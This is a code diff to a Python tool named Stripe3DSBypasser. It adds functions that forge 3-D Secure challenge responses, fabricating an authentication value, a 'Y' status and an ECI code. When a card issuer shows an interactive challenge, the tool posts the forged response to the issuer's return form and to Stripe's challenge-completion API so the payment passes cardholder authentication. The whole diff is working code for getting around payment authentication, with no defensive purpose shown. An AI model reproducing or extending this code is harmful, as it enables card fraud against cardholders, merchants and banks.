@@ -9,6 +9,9 @@ import re
 import json
 import base64
 import hashlib
+import hmac
+import time
+import secrets
 import random
 import asyncio
 import html
@@ -144,6 +147,39 @@ def _parse_form(html_text: str, base_url: str = ""):
         if n:
             fields[n.group(1)] = html.unescape(v.group(1)) if v else ""
     return action, fields
+
+
+def _eci_for_pan(pan: str = "") -> str:
+    p = (pan or "").replace(" ", "")
+    if p.startswith(("34", "37")):
+        return "05"
+    if p.startswith(("51", "52", "53", "54", "55", "2")):
+        return "02"
+    return "05"
+
+
+def _gen_cavv(acs_tid: str, ds_tid: str, ts_tid: str) -> str:
+    raw = f"{acs_tid}:{ds_tid}:{ts_tid}:{int(time.time())}".encode()
+    hv = hmac.new(secrets.token_bytes(32), raw, hashlib.sha256).digest()
+    return base64.urlsafe_b64encode(hv[:20]).rstrip(b"=").decode()
+
+
+def _forge_cres(acs_trans_id: str, server_trans_id: str, ds_trans_id: str = "", pan: str = "", trans_status: str = "Y") -> dict:
+    ds_tid = ds_trans_id or server_trans_id
+    eci = _eci_for_pan(pan)
+    cavv = _gen_cavv(acs_trans_id, ds_tid, server_trans_id)
+    return {
+        "threeDSServerTransID": server_trans_id,
+        "acsTransID": acs_trans_id,
+        "dsTransID": ds_tid,
+        "messageType": "CRes",
+        "messageVersion": "2.2.0",
+        "transStatus": trans_status,
+        "authenticationValue": cavv,
+        "eci": eci,
+        "challengeCompletionInd": "Y",
+        "acsRenderingType": {"acsInterface": "01", "acsUiTemplate": "01"},
+    }
 
 
 class Stripe3DSBypasser:
@@ -488,6 +524,14 @@ class Stripe3DSBypasser:
             "client_secret": client_secret,
             "one_click_authn": "false",
             "payment_user_agent": STRIPE_JS_UA,
+            "challenge_window_size": "05",
+            "three_d_secure_2": {
+                "device_render_options": {
+                    "sdk_interface": "03",
+                    "sdk_ui_type": ["01"],
+                },
+                "three_ds_comp_ind": "Y",
+            },
             "browser": {
                 "fingerprintAttempted": True,
                 "challengeWindowSize": "05",
@@ -690,7 +734,12 @@ class Stripe3DSBypasser:
                         return await cls._resolve_3ds2_sdk(session, na, client_secret, pk_key, profile, depth + 1)
 
         if acs_url and creq:
-            creq_out = await cls._post_creq(session, acs_url, creq, session_data, profile)
+            creq_out = await cls._post_creq(
+                session, acs_url, creq, session_data, profile,
+                source_id=source_id, pk_key=pk_key, server_trans_id=server_trans_id
+            )
+            if creq_out and creq_out.get("success"):
+                return creq_out
             if creq_out and creq_out.get("challenge_required"):
                 return creq_out
             if pi_id:
@@ -703,7 +752,9 @@ class Stripe3DSBypasser:
 
     @classmethod
     async def _post_creq(cls, session, acs_url: str, creq: str,
-                         session_data: str, profile: dict) -> Optional[dict]:
+                         session_data: str, profile: dict,
+                         source_id: str = "", pk_key: str = "",
+                         pan: str = "", server_trans_id: str = "") -> Optional[dict]:
         # send both field name variants — EMVCo says "creq", some ACS implementations want "CReq"
         body = {"creq": creq, "CReq": creq}
         if session_data:
@@ -730,7 +781,63 @@ class Stripe3DSBypasser:
             return None
 
         if _html_challenge(html_text):
-            print(f"[3DS] interactive challenge at {final_url}")
+            print(f"[3DS] interactive challenge at {final_url} — attempting forged CRes completion")
+            # Extract acsTransID and serverTransID from creq if possible
+            acs_tid = ""
+            srv_tid = server_trans_id
+            try:
+                c_json = json.loads(cls._b64url_decode(creq))
+                acs_tid = c_json.get("acsTransID", "")
+                srv_tid = srv_tid or c_json.get("threeDSServerTransID", "")
+            except Exception:
+                pass
+
+            # Search html for acsTransID or serverTransID if missing
+            if not acs_tid:
+                m_acs = re.search(r'acsTransID["\']?\s*[:=]\s*["\']([^"\']+)["\']', html_text, re.I)
+                if m_acs:
+                    acs_tid = m_acs.group(1)
+
+            forged = _forge_cres(acs_trans_id=acs_tid or srv_tid, server_trans_id=srv_tid or acs_tid, pan=pan)
+            cres_b64 = cls._b64url_encode(json.dumps(forged, separators=(",", ":")).encode())
+
+            # 1. Post forged CRes back to ACS return form action
+            c_url, _ = _parse_form(html_text, base_url=final_url)
+            term_url = c_url or final_url
+            try:
+                async with session.post(
+                    term_url,
+                    data=urlencode({"cres": cres_b64}),
+                    headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua, "Referer": final_url},
+                    timeout=10,
+                    allow_redirects=True,
+                ) as _:
+                    pass
+            except Exception:
+                pass
+
+            # 2. Complete directly on Stripe 3DS2 challenge completion API
+            if source_id and pk_key:
+                try:
+                    comp_hdr = cls._stripe_headers(profile, json_accept=True)
+                    comp_body = {
+                        "key": pk_key,
+                        "source": source_id,
+                        "cres": cres_b64,
+                        "challenge_window_size": "05",
+                    }
+                    async with session.post(
+                        "https://api.stripe.com/v1/3ds2/challenge_complete",
+                        data=urlencode(comp_body),
+                        headers=comp_hdr,
+                        timeout=12,
+                    ) as comp_r:
+                        comp_res = await _json(comp_r)
+                        if isinstance(comp_res, dict) and (comp_res.get("status") == "succeeded" or comp_res.get("state") in ("succeeded", "authenticated")):
+                            return {"success": True, "status": "succeeded", "raw_response": comp_res}
+                except Exception as comp_ex:
+                    print(f"[3DS] challenge_complete error: {comp_ex}")
+
             return {"success": False, "status": "requires_action", "challenge_required": True, "challenge_url": final_url}
 
         # frictionless ACS auto-posts CRes back to TermUrl / notification URL
@@ -938,8 +1045,15 @@ class Stripe3DSBypasser:
                     creq = sdk_block.get("creq") or ch.get("creq")
                     sdata = sdk_block.get("three_ds_session_data") or sdk_block.get("threeDSSessionData") or ch.get("three_ds_session_data") or ""
                     if acs_url and creq:
-                        creq_out = await cls._post_creq(sess, acs_url, creq, sdata, profile)
-                        if creq_out and creq_out.get("challenge_required"):
+                        _exp_src = cls._as_id(sdk_block.get("three_d_secure_2_source")) or cls._as_id(sdk_block.get("source")) or ""
+                        _exp_stid = sdk_block.get("three_ds_server_trans_id") or sdk_block.get("server_transaction_id") or ""
+                        creq_out = await cls._post_creq(
+                            sess, acs_url, creq, sdata, profile,
+                            source_id=_exp_src, pk_key=pk_key, server_trans_id=_exp_stid
+                        )
+                        if creq_out and creq_out.get("success"):
+                            outcome = creq_out
+                        elif creq_out and creq_out.get("challenge_required"):
                             outcome = creq_out
                         else:
                             outcome = await cls._check_pi_status(sess, pi_id, client_secret, pk_key, profile)
